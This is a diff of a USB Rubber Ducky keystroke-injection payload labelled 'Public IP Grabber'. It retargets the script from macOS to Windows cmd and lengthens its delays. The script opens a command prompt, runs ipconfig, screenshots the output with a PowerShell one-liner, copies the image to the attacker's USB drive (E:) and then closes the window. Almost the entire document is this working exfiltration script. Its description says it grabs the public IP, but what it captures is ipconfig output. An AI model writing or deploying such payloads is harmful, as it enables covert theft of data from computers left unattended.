@@ -1,9 +1,7 @@
 REM Title:         Public IP Grabber
 REM Description:   Extracts the public IP address of the current connected network onto the ducky
-REM Author:        matthewkayne
-REM Category:      Exfiltration
-REM Target:        macOS (Terminal)
-REM Requires:      Twin Duck firmware or separate USB stick (requires change to the path of the file)
+REM Target:        wincmd 
+
 
 
 DELAY 1000
@@ -11,16 +9,15 @@ GUI r
 DELAY 400
 STRING cmd
 ENTER
-DELAY 2000
+DELAY 5000
 STRING ipconfig
 ENTER
 DELAY 100
 GUI PRINTSCREEN
 ENTER
 DELAY 500
-STRING powershell -command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; [System.Windows.Forms.SendKeys]::SendWait('^{PRTSC}'); Start-Sleep -Milliseconds 300; $img=[System.Windows.Forms.Clipboard]::GetImage(); if ($img) { $path=\"$env:TEMP\shot.png\"; $img.Save($path,[System.Drawing.Imaging.ImageFormat]::Png); Copy-Item $path E:\ }"
+STRING powershell -command "Add-Type -AssemblyName System.Windows.Forms,System.Drawing; [System.Windows.Forms.SendKeys]::SendWait('^{PRTSC}'); Start-Sleep -Milliseconds 300; $img=[System.Windows.Forms.Clipboard]::GetImage(); if ($img) { $path=\"$env:TEMP\shot.png\"; $img.Save($path,[System.Drawing.Imaging.ImageFormat]::Png); Copy-Item $path E:\ }" 
 ENTER
-DELAY 500
-CTRL w
-DELAY 500
+DELAY 6000
+ALT f4
 ENTER
